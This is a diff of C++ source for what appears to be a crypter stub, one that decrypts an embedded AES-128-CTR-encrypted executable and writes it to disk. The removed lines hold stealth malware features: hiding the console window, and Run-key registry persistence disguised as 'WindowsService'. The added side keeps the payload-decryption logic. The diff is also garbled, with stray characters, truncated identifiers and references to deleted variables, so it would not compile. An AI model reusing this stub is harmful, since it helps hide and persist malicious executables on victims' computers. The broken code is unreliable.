@@ -8,41 +8,12 @@
 #include <cstdint>
 #include <random>
 #include <ctime>
-#include <chrono>
-#include <thread>
 
-#ifdef _WIN32
-#include <windows.h>
-#endif
+// Standalone Basic Stub - Simple and clean
+const std::string KEY_D6ODhAQN = "62a5eddf705a70533caca9594a7ee1b6";
+const std::string NONCE_LwVJpJwR = "73273d8488e667977ab2b24381db6f67";
 
-// Standalone Stealth Stub - Silent operation + Auto-startup
-const std::string KEY_tpP3NaE6 = "e166896183c7d6906fbd8d48f92e1fce";
-const std::string NONCE_emjxG61X = "e761c27e138d8e40b4351acb206807eb";
-
-// Stealth features
-void setupAutoStartup() {
-    #ifdef _WIN32
-    HKEY hKey;
-    char exePath[MAX_PATH];
-    GetModuleFileNameA(NULL, exePath, MAX_PATH);
-    
-    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
-        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
-        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-        RegSetValueExA(hKey, "WindowsService", 0, REG_SZ, 
-            (const BYTE*)exePath, strlen(exePath) + 1);
-        RegCloseKey(hKey);
-    }
-    #endif
-}
-
-void hideConsole() {
-    #ifdef _WIN32
-    ShowWindow(GetConsoleWindow(), SW_HIDE);
-    #endif
-}
-
-// AES-128-CTR implementation (same as basic)
+// AES-128-CTR implementation
 static const uint8_t sbox[256] = {
     0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
     0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
@@ -62,7 +33,7 @@ static const uint8_t sbox[256] = {
     0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
 };
 
-// AES helper functions (same as basic)
+// AES helper functions
 inline uint8_t gmul(uint8_t a, uint8_t b) {
     uint8_t p = 0;
     for (int i = 0; i < 8; i++) {
@@ -172,30 +143,26 @@ void hexToBytes(const std::string& hex, uint8_t* bytes) {
 }
 
 int main() {
-    // Stealth mode - hide console
-    hideConsole();
-    
-    // Setup auto-startup
-    setupAutoStartup();
-    
-    // Embedded encrypted executable data
-const uint8_t embeddedData[] = {0xe3, 0x83, 0xb8, 0x41, 0xcf, 0xb5, 0x05, 0x98, 0x6c, 0x5c, 0xef, 0x76, 0x9e, 0x33, 0x2b, 0x0b, 0x9f, 0x14, 0x4a, 0x90, 0x92, 0xce, 0xbc, 0xa5, 0x00, 0x38, 0xa1, 0x9c, 0x33, 0x2d, 0x53, 0x59, 0x93, 0xd9, 0x62, 0x34, 0x81, 0xce, 0xf1, 0xc1, 0xfb, 0x5f, 0xec, 0x4a, 0xb6, 0x70, 0xfa, 0xee, 0xaa, 0x9f, 0x74, 0xb9, 0x42, 0xbe, 0xf2, 0xc3, 0x74, 0xcd, 0xdf, 0xd9, 0x97, 0x20, 0x70, 0xe5, 0x15, 0xf4, 0x0d, 0xee, 0xbd, 0x0b, 0x2a, 0x7c, 0x37, 0xc9, 0x79, 0xbb, 0x88, 0x01, 0x24, 0x90, 0x34, 0xda, 0xd9, 0x4a, 0x20, 0xf4, 0x42, 0x69, 0x3a, 0x2d, 0xd6, 0x56, 0x38, 0xc9, 0xab, 0x85, 0xf2, 0x3a, 0xf6, 0x3b, 0x92, 0x27, 0xac, 0x59, 0xa1, 0xe6, 0xea, 0x41, 0xe3, 0xb3, 0xcf, 0x28, 0x62, 0xf0, 0x3b, 0x5e, 0x64, 0x56, 0xee, 0xc3, 0x0e, 0x50, 0x62, 0xda, 0x4e};
-const size_t embeddedDataSize = sizeof(embeddedData);ta
+    // Standalone stub - no embedded data
     // Standalone stub - no embedded data}
     
     // Convert hex strings to bytes
     uint8_t key[16], nonce[16];
-    hexToBytes(Y_tpP3NaE6, key);
-    hexToBytes(E_emjxG61X, nonce);
+    hexToBytes(KEY_D6ODhAQN, key);
+    hexToBytes(NONCE_LwVJpJwR, nonce);
     
     // Decrypt the data using AES-128-CTR
     aesCtrCrypt(embeddedData, embeddedData, embeddedDataSize, key, nonce);
     
-    // Write decrypted data to file (silent)
+    // Write decrypted data to file
     std::ofstream outFile("decrypted_output.bin", std::ios::binary);
     if (outFile.is_open()) {
         outFile.write(reinterpret_cast<char*>(embeddedData), embeddedDataSize);
         outFile.close();
+        std::cout << "Data decrypted and saved to decrypted_output.bin" << std::endl;
+    } else {
+        std::cerr << "Failed to create output file" << std::endl;
+        return 1;
     }
     
     return 0;
